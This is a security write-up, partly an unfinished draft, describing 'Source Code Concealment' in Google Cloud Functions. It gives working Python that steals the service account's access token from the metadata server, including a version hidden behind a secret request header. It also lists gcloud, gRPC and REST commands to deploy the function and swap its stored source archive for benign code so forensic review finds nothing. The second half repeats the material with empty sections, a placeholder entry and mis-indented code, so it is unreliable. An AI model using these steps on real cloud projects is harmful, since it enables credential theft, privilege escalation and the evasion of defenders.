# Source Code Concealment in Cloud Functions - Attack & Detection

- [Attack](#Attack)
  - [Way I - Deploy a Cloud Function in Google Cloud Platform](#) 
    - [APIs and Permissions required for Concealing the Source Code via gCloud](#)
      - [Concealing the Source Code via gCloud](#)
    - [APIs and Permissions required for Concealing the Source Code via Cloud Function API (gRPC)](#)
      - [Concealing the Source Code via Cloud Function API (gRPC)](#)
    - [APIs and Permissions required for Concealing the Source Code via Cloud Function API (REST)](#)
      - [Concealing the Source Code via Cloud Function API (REST)](#)
  - [Way II - Update a Cloud Function in Google Cloud Platform](#)

Cloud Functions are a prime target for Privilege Escalation which is evidently clear by past research "[Privilege Escalation via Cloud Functions](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md)". One way to detect Cloud Function abuse was to download the source code from Cloud Storage, where it is saved following the Function Deployment or Update process and analyzing it. In this post, I will be introducing an interesting technique I came across while researching "[Privilege Escalation via Cloud Functions](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md)" which can disrupt that detection technique and ultimately prevent any alert. The technique is called "Source Code Concealment".

Cloud Function Source Code Concealment is a technique which enables an attacker to effectively Conceal or Hide malicious source code in Cloud Function by replacing it with non-malicious code. This technique ensures that no artifacts or traces are left behind that could potentially point to the malicious source code ever used, thus letting the attacker evade any security measures and maintain a stealthy presence within the Google Cloud Environment.

Source Code Concealment targets the Storage Object "function-source.zip" within the Cloud Storage Bucket where the source code is saved following the Function Deployment or Update process. In this attack we basically remove the malicious zip file from the Cloud Storage Bucket and replace it with a non-malicious zip file. This updates the Cloud Function with Non-malicious code but if we trigger the function endpoint it'll execute the malicious code. (depending on the presence of specific [conditions](#we-will-modify-the-malicious-code-now-to-introduce-the-conditions)). The malicious code once deleted from the Cloud Storage will be completely deleted leaving no artifacts or trace behind.

>Note: Even if you upload the source code Locally or via Cloud Repository, it will still be saved in Cloud Storage Bucket.

In Theory it might be confusing so let's get Practical.

If an attacker want's to abuse Cloud Function for malicious purpose be it Privilege Escalation, Persistence, Impact etc. they typically have three primary options to choose from:
- Deploy a Cloud Function.
- Update the Cloud Function.
- Delete a Cloud Function.

The primary objective of Deleting a Cloud Function is to create an [Impact](https://attack.mitre.org/tactics/TA0040/) rather than facilitate something important like Privilege Escalation or Persitence etc, moreover there is no point in concealing source code for the function we are going to delete. Thus, we will concentrate on concealing the source code for remaining two strategies:
- Deploy a Cloud Function.
- Update the Cloud Function.

## Way I - Deploy a Cloud Function in Google Cloud Platform

Before you deploy a Cloud Function make sure you have: 

1. The neccesary APIs and Permissions required for Deploying a Cloud Function (gCloud, Cloud Function API (gRPC & REST)).

    - [APIs and Permissions required for Deploying Cloud Function via gCloud](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#apis-and-permissions-required-for-deploying-a-cloud-function-via-gcloud)

    - [APIs and Permissions required for Deploying Cloud Function via Cloud Function API (gRPC & REST)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#apis-and-permissions-required-for-deploying-a-cloud-function-via-cloud-function-api-grpc--rest)

2. The Malicious source code and Non-malicious source code in place.

#### In our case the Malicious and Non-malicious source code are given below:

```python
#Malicious Source Code
#filename: main.py

import requests

def anirban(request):
    metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
    metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
    metadata_headers = {"Metadata-Flavor": "Google"}
    response = requests.get(metadata_key_url, headers=metadata_headers)
    access_token = response.text
    return access_token
```

```python
#filename: requirements.txt

requests
```
To cover the Malcious Source Code, we'll be using a Non-Malicious source code.

```python
#Non-Malicious Source Code
#filename: main.py

import requests

def anirban(request):
    request_json = request.get_json()
    if request.args and 'message' in request.args:
        return request.args.get('message')
    elif request_json and 'message' in request_json:
        return request_json['message']
    else:
        return f'Hello World!'
```

```python
#filename: requirements.txt

requests
```
Pack the Malicious Source Code (main.py) and requirements.txt into a zip file and upload it to a different Cloud Storage Account (not same account where you're exploiting the Cloud Function) you have full access to (Editor) and make it public. Copy the gsutil link of the malicious zip file.

Once you have the gsutil URI of the malicious zip file go ahead Deploy a Function via any method (gCloud, Cloud Function API)

Command to [deploy Cloud Function via gCloud](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-gcloud):
```powershell
gcloud functions deploy <function-name> --runtime=python38 --source=<gs-link-of-malicious-sourcecode> --entry-point=<function-entrypoint> --trigger-http --service-account=<service-account-email>
```

Command to [deploy Cloud Function via Cloud Function API (gRPC)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-grpc):
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gs-link-of-malicious-sourcecode> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```

Command to [deploy Cloud Function via Cloud Function API (REST)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-rest):
```powershell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"name\":\"projects/<project-id>/locations/<region>/functions/<function-name>\",\"entryPoint\":\"<function-entrypoint>\",\"runtime\":\"python38\",\"serviceAccountEmail\":\"<service-account-email>\",\"sourceArchiveUrl\":\"<gs-link-of-malicious-sourcecode>\",\"httpsTrigger\":{}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json
```

After Deploying the Function successfully and [Binding an IAM Policy to the Cloud Function](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#phase-ii---ways-to-set-iam-policy-binding-to-a-cloud-function-in-google-cloud-platform) (so principals can Invoke it) we can move into Concealing the Source Code. But to do that we'd require certain APIs to be enabled and certain permissions to be granted. 

### APIs and Permissions required for Concealing the Source Code via gCloud

API need to enabled:
- asdasd

Permission required:
- storage.buckets.list (Optional)
- storage.objects.list
- storage.objects.delete
- storage.objects.create

**storage.buckets.list** - This permission is required to list the buckets in the Cloud Storage Bucket. It is optional and not required if you know the "Project Number", as the name of the bucket is in the format of `gcf-sources-<project_number>-<region>`.

**storage.objects.list** - This permission is required to list the objects in the Cloud Storage Bucket. It is required because the Cloud Storage Object name is in the format of `<function_name>-<unique_identifier>`. We can't figure out the Unique Identifier.

**storage.objects.delete** - This permission is required to delete an object from the Cloud Storage Bucket. Basically it will help replace the Malicious Source Code with the Non-malicious source code. 

**storage.objects.create** - This permission is required to create a new object in the Cloud Storage Bucket. This is required because we will be uploading the Non-Malicious source code to the Cloud Storage Bucket.

### Concealing the Source Code via gCloud

>Before moving forward pack the Non-Malicious Source Code (main.py) and requirements.txt into a zip file and rename it "function-source.zip".

There are three steps to conceal the source code via gCloud:

1. List the objects in the bucket "gcf-sources-<project_number>-<region>".

Command:

```powershell
gcloud storage ls gs://gcf-sources-<project_number>-<region> 
```

2. List the objects inside the "<function_name>-<unique_identifier>/version-1" folder in the "gcf-sources-<project_number>-<region>" bucket.

Command:

```powershell
gcloud storage ls gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1
```

3. Copy the Non-Malicious Source Code from Local Machine to the "<function_name>-<unique_identifier>/version-1/" folder in the "gcf-sources-<project_number>-<region>" bucket on Google Cloud Storage. This will replace the Malicious Source Code with the Non-Malicious Source Code.

Command:

```powershell
gcloud storage cp <local-path-of-non-malicious-sourcecode> gs://gcf-sources-<project_number>-<region>/<function_name>-<unique_identifier>/version-1/
```

<p><img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/Source-Code-Concealment/1.png"></p> 

Now when we look at the Source Code of the Cloud Function, we can see that the Source Code has changed.

<p><img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/Source-Code-Concealment/2.png"></p> 

Let's trigger the Cloud Function and see if which code is being executed.

<p><img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/Source-Code-Concealment/3.png"></p> 

The Malicious Code is being Executed. 

The Source Code has been successfully Concealed. Upon looking the at the Source Code we can see that the Source Code looks Non-Malicious. But when we trigger the Cloud Function, the Malicious Source Code is being executed. 

Now there's a problem with that. The Cloud Function looks Non-malicious but triggers malicious code. It does hides the Source Code but still there's an artifact left which is the Cloud Function Output. If someone triggers the Cloud Function, they can see the Malicious Code's Output, which can raise suspicions. We can give the Role "Cloud Function Invoker" to our principal and give us the only permission to trigger the Cloud Function. But anyone with the required permissions can change the Cloud Function permissions and trigger the Cloud Function. So how do we hide the trigger output from everyone else?

Well we can modify our code to introduce conditions to check the presense of a certian header and header value in the request. If the header is present and the header value is correct, the malicious code will be executed. If the header is not present or if header is present but value is wrong, the non-malicious code will be executed. 

#### We will modify the [Malicious code](#in-our-case-the-malicious-and-non-malicious-source-code-are-given-below) now to introduce the conditions.

```python
# Malicious Source Code
# filename: main.py

import requests

def anirban(request):
    if request.headers.get('my-header') == 'anirban-gcp':
        metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
        metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
        metadata_headers = {"Metadata-Flavor": "Google"}
        response = requests.get(metadata_key_url, headers=metadata_headers)
        access_token = response.text
        return access_token
    else:
        request_json = request.get_json()
        if request.args and 'message' in request.args:
            return request.args.get('message')
        elif request_json and 'message' in request_json:
            return request_json['message']
        else:
            return f'Hello World!'
```

```python
#filename: requirements.txt

requests
```

We will keep the non malicious code same.

```python
#Non-Malicious Source Code
#filename: main.py

import requests

def anirban(request):
    request_json = request.get_json()
    if request.args and 'message' in request.args:
        return request.args.get('message')
    elif request_json and 'message' in request_json:
        return request_json['message']
    else:
        return f'Hello World!'
```

```python
#filename: requirements.txt

requests
```
Once again, deploy the Cloud Function but this time with the above modified "Malicious Code". Pack the Modified Malicious Source Code (main.py) and requirements.txt into a zip file and upload it to a different Cloud Storage Account you have full access to and make it public. Copy the gsutil link of the modified malicious zip file.

Once you have the gsutil URI of the modified malicious zip file go ahead Deploy a Function via any method (gCloud, Cloud Function API)

Command to [deploy Cloud Function via gCloud](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-gcloud):
```powershell
gcloud functions deploy <function-name> --runtime=python38 --source=<gs-link-of-modified-malicious-sourcecode> --entry-point=<function-entrypoint> --trigger-http --service-account=<service-account-email>
```

Command to [deploy Cloud Function via Cloud Function API (gRPC)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-grpc):
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gs-link-of-modified-malicious-sourcecode> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```

Command to [deploy Cloud Function via Cloud Function API (REST)](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#deploying-a-cloud-function-via-cloud-function-api-rest):
```powershell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"name\":\"projects/<project-id>/locations/<region>/functions/<function-name>\",\"entryPoint\":\"<function-entrypoint>\",\"runtime\":\"python38\",\"serviceAccountEmail\":\"<service-account-email>\",\"sourceArchiveUrl\":\"<gs-link-of-modified-malicious-sourcecode>\",\"httpsTrigger\":{}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json
```

After Deploying the Function successfully and [Binding an IAM Policy to the Cloud Function](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md#phase-ii---ways-to-set-iam-policy-binding-to-a-cloud-function-in-google-cloud-platform) (so principals can Invoke it). Repeat the Step 1, 2 & 3 to [Conceal the Source Code](#concealing-the-source-code-via-gcloud) again. 

Now we can trigger the Function Endpoint and see the output.

```powershell
curl -H "my-header: anirban-gcp" https://<your-region>-<your-project-id>.cloudfunctions.net/<function-name>
```

<p><img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/Source-Code-Concealment/4.png"></p>

Earlier, upon looking the at the Source Code, the **Source Code looked Non-Malicious**. But when we triggered the Cloud Function, the **Malicious Source Code was being executed**.
Now, upon looking the at the Source Code, the **Source Code looks Non-Malicious**. But when we trigger the Cloud Function, the **Non-Malicious Source Code is being executed**.

There is no artifact left of the Malicious Source Code used in the Cloud Function. The Cloud Function Source Code is now properly concealed.



------------------------------------------------------------------------------------------------------------------------------------------------




# Source Code Concealment in Cloud Functions - Attack & Detection

- [Attack](#Attack)
  - [Way I - Deploy a Cloud Function in Google Cloud Platform](#)
    - [APIs and Permissions Required for Deploying a Cloud Function via gCloud](#)
      - [Deploying a Cloud Function via gCloud](#) 
      - [Concealing the Source Code via gCloud](#)
    - [APIs and Permissions Required for Deploying a Cloud Function via Cloud Function API (gRPC & REST)](#)
      - [Deploying a Cloud Function via Cloud Function API (gRPC)](#)
      - [Deploying a Cloud Function via Cloud Function API (REST)](#)
      - [Concealing the Source Code via Cloud Function API (gRPC)](#)
      - [Concealing the Source Code via Cloud Function API (REST)](#)
  - [Way II - Update a Cloud Function in Google Cloud Platform](#)
    - [APIs and Permissions Required for Updating a Cloud Function via gCloud](#)
      - [Updating a Cloud Function via gCloud](#) 
      - [Concealing the Source Code via gCloud](#)
    - [APIs and Permissions Required for Updating a Cloud Function via Cloud Function API (gRPC & REST)](#)
      - [Updating a Cloud Function via Cloud Function API (gRPC)](#)
      - [Updating a Cloud Function via Cloud Function API (REST)](#)
      - [Concealing the Source Code via Cloud Function API (gRPC)](#)
      - [Concealing the Source Code via Cloud Function API (REST)](#)


Cloud Function Source Code Concealment is a technique which enables an attacker to effectively Conceal or Hide malicious source code in Cloud Function by replacing it with non-malicious code. I came across this technique while I was researching "[Privilege Escalation via Cloud Functions](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md)". 

This technique ensures that no artifacts or traces are left behind that could potentially point to the malicious source code ever used, thus letting the attacker evade traditional security measures and maintain a stealthy presence within the Google Cloud Environment.

Cloud Functions are a prime target for Privilege Escalation which is evidently clear by our past research "[Privilege Escalation via Cloud Functions](https://github.com/anrbn/GCP-Attack-Defense/blob/main/CloudFunction/PrivEsc-via-CloudFunction.md)". One way to detect Cloud Function abuse was to download the source code from Cloud Storage, where it is saved following the Function Deployment or Update process and analyzing it. In this post, we will explore an interesting technique designed to disrupt that detection technique and ultimately preventing any alert.

### Source Code Concealment
Source Code Concealment targets the Cloud Storage Bucket where the source code is saved following the Function Deployment or Update process. In this attack we basically remove the malicious zip file from the Cloud Storage Bucket and replace it with a non-malicious zip file. This updates the Cloud Function and shows the Non-malicious code but if we trigger the function endpoint it'll still execute the malicious code. 
Basically, we are seeing a Non-Malicious code but the function will still execute the Malicious code. This is how we can conceal the source code. The malicious code once deleted from the Cloud Storage will be completely deleted leaving no artifacts or trace behind.

>Note: Even if you upload the source code Locally or via Cloud Repository, it will still be saved in Cloud Storage Bucket.

Let's get Practical.

If an attacker want's to abuse Cloud Function for malicious purpose be it Privilege Escalation, Persistence, Impact etc. they typically have three primary options to choose from:
- Deploy a Cloud Function.
- Update the Cloud Function.
- Delete a Cloud Function.

The primary objective of Deleting a Cloud Function is to create an [Impact](https://attack.mitre.org/tactics/TA0040/) rather than facilitate something important like Privilege Escalation or Persitence etc, moreover there is no point in concealing source code for the function we are going to delete. Thus, we will concentrate on concealing the source code for remaining two strategies:
- Deploy a Cloud Function.
- Update the Cloud Function.

Let's take for instance you want to privilege escalate, you can do that via Deploying a Cloud Function or Updating it. With both of these there is a great chance of detection, because the code can be downloaded from Cloud Storage and examined for anything malicious even if you obfuscate it. So how can one overcome it? This is where Source Code Concealment technique into play.

### APIs and Permissions required for Deploying Cloud Function via gCloud

>We'll be using **Cloud Storage** to set the code in Cloud Function.

APIs need to be Enabled

- cloudfunctions.googleapis.com (Cloud Functions API)
- cloudbuild.googleapis.com (Cloud Build API)
- cloudresourcemanager.googleapis.com (Cloud Resource Manager API)

Permissions Required

- iam.serviceAccounts.actAs
- cloudfunctions.functions.create
- cloudfunctions.functions.get

### Deploying Cloud Function via gCloud

Command:
```powershell
gcloud functions deploy <function-name> --runtime=python38 --source=<gs-link-to-zipped-sourcecode> --entry-point=<function-entrypoint> --trigger-http --service-account=<service-account-email>
```
After the source has been uploaded, we can now move onto concelaing/hiding the source code.

### APIs and Permissions required for concealing the Source Code via gCloud

APIs need to be Enabled

- 

Permissions Required

- storage.objects.create
- storage.objects.delete
- storage.objects.list

### Concealing the Source Code via gCloud



### APIs and Permissions required for Deploying Cloud Function (Cloud Storage) via Cloud Function API (gRPC & REST)

APIs need to be Enabled

- cloudbuild.googleapis.com (Cloud Build API)

Permissions Required

- iam.serviceAccounts.actAs
- cloudfunctions.functions.create

### Deploying Cloud Function via Cloud Function API (gRPC)

### Deploying Cloud Function via Cloud Function API (REST)

### Concealing the Source Code via Cloud Function API (gRPC)

### Concealing the Source Code via Cloud Function API (REST)

Before you deploy the Cloud Function, you need to have the malicious source code and it's replacement, a non-malicious source code in place.

In our case:

```python
#Malicious Source Code

import requests

def anirban(request):
    metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
    metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
    metadata_headers = {"Metadata-Flavor": "Google"}
    response = requests.get(metadata_key_url, headers=metadata_headers)
    access_token = response.text
    return access_token
```

```python
#Requirements.txt
requests
```
To cover the Malcious Source Code, we'll be using a Non-Malicious code, a simple Hello World code given by Google.

```python
#Non-Malicious Source Code

import requests

def anirban(request):
    request_json = request.get_json()
    if request.args and 'message' in request.args:
        return request.args.get('message')
    elif request_json and 'message' in request_json:
        return request_json['message']
    else:
        return f'Hello World!'
```

```python
#Requirements.txt
requests
```

Pack the Malicious Source Code and Requirements.txt into a zip file and upload it to a different Cloud Storage Account (not same account where you're exploiting the Cloud Function) you have full access to (Editor) and make it public. Copy the gsutil link of the zip file.

We'll be using both [gLess](https://github.com/anrbn/gLess) & [gCloud](https://cloud.google.com/cli) to deploy a Cloud Function via Cloud Storage.

Command to deploy Cloud Function via gLess (Cloud Function API -gRPC)

```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gsutil-uri> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```

Command to deploy Cloud Function via gLess
```powershell
gcloud functions deploy <function-name> --runtime=python38 --source=<gs-link-to-zipped-sourcecode> --entry-point=<function-entrypoint> --trigger-http --service-account=<service-account-email>
```

After the Cloud Function is deployed, the next step is to hide the Source Code by replacing it with a non non-malicious code. Here's how to do it and the permissions required to do it.

Permission Required to Conceal the Source Code via gCloud
- storage.objects.list
- storage.objects.create
- storage.objects.delete

Permission Required to Conceal the Source Code via Cloud Function API






Permission Required to Conceal the Source Code via gCloud

### Updating Cloud Function and Concealing the Source Code

We'll be using both [gLess](https://github.com/anrbn/gLess) & [gCloud](https://cloud.google.com/cli) to updating a Cloud Function via Cloud Storage. However things wSince, we will be Concealing the Source Code we would first need to 


```python
def anirban(request):
    if request.headers.get('my-header') == 'whatsup':
        metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
        metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
        metadata_headers = {"Metadata-Flavor": "Google"}
        response = requests.get(metadata_key_url, headers=metadata_headers)
        access_token = response.text
        return access_token
    else:
        request_json = request.get_json()
        if request.args and 'message' in request.args:
        return request.args.get('message')
        elif request_json and 'message' in request_json:
        return request_json['message']
        else:
        return f'Hello World!'


curl -H "my-header: my-value" https://<your-region>-<your-project-id>.cloudfunctions.net/anirban

curl https://us-central1-daring-pilot-379814.cloudfunctions.net/function-2
curl -H "my-header: my-value" https://us-central1-daring-pilot-379814.cloudfunctions.net/function-2
curl -H "my-header: whatsup" https://us-central1-daring-pilot-379814.cloudfunctions.net/function-2

```